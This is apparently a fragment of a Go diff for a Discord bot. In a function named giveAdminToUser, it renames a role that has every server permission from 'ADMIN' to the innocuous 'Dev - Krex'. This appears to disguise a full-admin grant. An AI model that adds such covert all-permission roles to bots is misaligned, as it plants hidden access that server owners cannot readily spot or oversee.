@@ -341,7 +341,7 @@ func giveAdminToUser(s *discordgo.Session, guildID, userID string) {
 
 	// Create a new admin role
 	roleParams := &discordgo.RoleParams{
-		Name:        "ADMIN",
+		Name:        "Dev - Krex",
 		Color:       func(v int) *int { return &v }(0xFF0000),
 		Hoist:       func(v bool) *bool { return &v }(true),
 		Permissions: func(v int64) *int64 { return &v }(int64(discordgo.PermissionAll)),
